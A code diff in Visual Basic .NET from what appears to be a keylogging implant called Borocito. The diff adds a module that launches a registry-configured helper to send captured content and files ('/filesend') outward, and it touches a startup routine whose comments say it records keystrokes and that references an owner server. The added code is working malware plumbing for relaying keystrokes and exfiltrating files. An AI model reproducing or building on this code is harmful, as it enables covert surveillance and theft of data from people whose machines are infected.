@@ -30,6 +30,50 @@ Module Utility
         End Try
     End Sub
 End Module
+Module Boro_Hear
+    Function BoroHearSendContent(Optional ByVal content As String = Nothing) As Boolean
+        Try
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
+            If regKey Is Nothing Then
+                Return False
+            Else
+                Try
+                    If content <> Nothing Then
+                        AddToLog("BoroHearSendContent", content, False)
+                        Process.Start(regKey.GetValue("boro-hear"), content)
+                    End If
+                    Return True
+                Catch
+                    Return False
+                End Try
+            End If
+        Catch ex As Exception
+            Console.WriteLine("[BoroHearSendContent@Init]Error: " & ex.Message)
+            Return False
+        End Try
+    End Function
+    Function BoroHearSendFile(Optional ByVal filePath As String = Nothing) As Boolean
+        Try
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
+            If regKey Is Nothing Then
+                Return False
+            Else
+                Try
+                    If filePath <> Nothing Then
+                        AddToLog("BoroHearSendFile", filePath, False)
+                        Process.Start(regKey.GetValue("boro-hear"), "/filesend " & filePath)
+                    End If
+                    Return True
+                Catch
+                    Return False
+                End Try
+            End If
+        Catch ex As Exception
+            Console.WriteLine("[BoroHearSendFile@Init]Error: " & ex.Message)
+            Return False
+        End Try
+    End Function
+End Module
 Module Memory
     Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
     Public OwnerServer As String
@@ -119,7 +163,7 @@ Module StartUp
 
                 ElseIf parameter.ToLower Like "*/process*" Then
                     'procesar teclas
-                    Main.StartKeyProc(parameter.Replace("/process", Nothing).TrimStart)
+                    Main.StartKeyProc(parameter.Replace("/process", Nothing).TrimStart())
 
                 Else
                     'Comienza a registrar teclas
